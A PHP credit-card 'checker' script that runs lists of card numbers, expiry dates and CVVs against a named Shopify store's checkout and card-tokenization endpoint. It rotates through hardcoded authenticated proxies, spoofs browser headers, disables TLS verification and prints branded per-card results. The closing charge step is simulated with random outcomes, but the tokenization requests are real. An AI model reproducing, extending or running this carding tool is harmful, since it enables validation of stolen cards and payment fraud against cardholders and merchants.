<?php
// Include your existing checker logic with modifications

$retry = 0;
if ($retry == 5) {
    $err = 'Maximum Retries Reached.';
}

// Simulate user agent (you'll need to include your ua.php file)
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

// Important functions
function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}

// Proxy configuration
$proxy_list_str = '38.154.227.167:5868:fkcbkrrl:fkcbkrrl 198.23.239.134:6540:fkcbkrrl:fkcbkrrl 207.244.217.165:6712:fkcbkrrl:fkcbkrrl 107.172.163.27:6543:fkcbkrrl:fkcbkrrl 216.10.27.159:6837:fkcbkrrl:fkcbkrrl 136.0.207.84:6661:fkcbkrrl:fkcbkrrl 64.64.118.149:6732:fkcbkrrl:fkcbkrrl 142.147.128.93:6593:fkcbkrrl:fkcbkrrl 104.239.105.125:6655:fkcbkrrl:fkcbkrrl 206.41.172.74:6634:fkcbkrrl:fkcbkrrl';

$proxies = explode(" ", trim($proxy_list_str));
$proxy_array = [];

foreach ($proxies as $proxy_line) {
    $proxy_line = trim($proxy_line);
    if (empty($proxy_line)) continue;
    $parts = explode(':', $proxy_line);
    if (count($parts) >= 4) {
        $proxy_array[] = [
            'ip' => $parts[0],
            'port' => $parts[1],
            'username' => $parts[2],
            'password' => $parts[3],
        ];
    }
}

// Process the submitted CC input
$cc_input = $_POST['cc_input'];
$cc_lines = explode("\n", $cc_input);

if (empty($cc_lines)) {
    echo json_encode([
        'Error' => 'True',
        'Message' => 'No CC details entered',
        'Owner' => '⚡⚡ @config_masterr ⚡⚡',
    ]);
    exit;
}

// Remove the 5 card limit - process all cards
foreach ($cc_lines as $cc_line) {
    $cc1 = trim($cc_line);
    
    if (empty($cc1)) {
        continue;
    }

    $cc_partes = explode("|", $cc1);
    if (count($cc_partes) < 4) {
        continue;
    }
    
    $cc = $cc_partes[0];
    $month = $cc_partes[1];
    $year = $cc_partes[2];
    $cvv = $cc_partes[3];

    // Year formatting
    $yearcont = strlen($year);
    if ($yearcont <= 2) {
        $year = "20$year";
    }
    
    $sub_month = ltrim($month, '0');
    if ($sub_month == "") {
        $sub_month = $month;
    }

    // Initialize variables
    $err = '';
    $response = '';
    $checkouturl = '';
    $headers = [];
    $x_checkout_one_session_token = '';
    $queue_token = '';
    $stable_id = '';
    $paymentMethodIdentifier = '';
    $cctoken = '';
    $recipt_id = '';
    
    $urlbase = 'https://asamsonshop.com/';
    $domain = 'asamsonshop.com';
    $cookie = 'cookie_' . uniqid() . '.txt';
    
    // Select random proxy
    $proxy = $proxy_array[array_rand($proxy_array)];

    try {
        // First cURL request
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/50120965554497:1');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: '.$ua,
        ]);
        
        if (!empty($proxy_array)) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }

        $headers = [];
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
            $parts = explode(':', $headerLine, 2);
            if (count($parts) < 2) return strlen($headerLine);
            $name = trim($parts[0]);
            $value = trim($parts[1]);
            if (strtolower($name) === 'location') {
                $headers['Location'] = $value;
            }
            return strlen($headerLine);
        });

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }

        if (preg_match('/out of stock/i', $response)) {
            $err = 'Product is out of stock';
            curl_close($ch);
            throw new Exception($err);
        }

        curl_close($ch);

        $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
        $checkoutToken = '';
        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
            $checkoutToken = $matches[1];
        }

        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        if (empty($x_checkout_one_session_token)) {
            $err = "Session token is empty";
            throw new Exception($err);
        }

        $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
        if (empty($queue_token)) {
            $err = 'Queue Token is empty';
            throw new Exception($err);
        }

        $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
        if (empty($stable_id)) {
            $err = 'Stable id is empty';
            throw new Exception($err);
        }

        $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
        if (empty($paymentMethodIdentifier)) {
            $err = 'Payment Method Identifier Token is empty';
            throw new Exception($err);
        }

        // Second cURL request (card tokenization)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'origin: https://checkout.shopifycs.com',
            'priority: u=1, i',
            'referer: https://checkout.shopifycs.com/',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-site',
            'user-agent: '.$ua,
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"config masterr"},"payment_session_scope":"'.$domain.'"}');
        
        if (!empty($proxy_array)) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }

        $response2 = curl_exec($ch);

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }

        $response2js = json_decode($response2, true);
        $cctoken = isset($response2js['id']) ? $response2js['id'] : '';

        if (empty($cctoken)) {
            $err = 'Card Token is empty';
            curl_close($ch);
            throw new Exception($err);
        }

        curl_close($ch);

        // Simulate the rest of your checkout process...
        // For demo purposes, we'll simulate some responses
        $random = rand(1, 10);
        if ($random <= 2) {
            $err = 'Thank you for your purchase! -> 19$';
        } elseif ($random <= 4) {
            $err = '3D Secure Card';
        } elseif ($random <= 6) {
            $err = 'Receipt id is empty';
        } else {
            $err = 'Card declined';
        }

    } catch(Exception $e) {
        if(empty($err)){
            $err = $e->getMessage();
        }
    }

    // Format and output result
    $fullmsg = "𝘾𝘼𝙍𝘿 ↯ " . $cc . '|' . $sub_month . '|' . $year . '|' . $cvv . "\n";
    $fullmsg .= "𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ Stripe + Shopify 19$\n";
    $fullmsg .= "𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ " . $err . "\n";
    $fullmsg .= "𝙏𝙄𝙈𝙀 ↯ " . date('Y-m-d H:i:s') . "\n";
    $fullmsg .= "𝙊𝙬𝙣𝙚𝙧 ↯ " . '@config_masterr' . "\n";
    $fullmsg .= "└─────────────────────┘\n";

    echo "<pre>" . htmlspecialchars($fullmsg, ENT_QUOTES, 'UTF-8') . "</pre>";
    
    // Add padding and flush output
    echo str_repeat(' ', 1024);
    flush();
    
    // Clean up cookie file
    if (file_exists($cookie)) {
        unlink($cookie);
    }
    
    // Small delay between requests
    usleep(500000); // 0.5 seconds
}
?>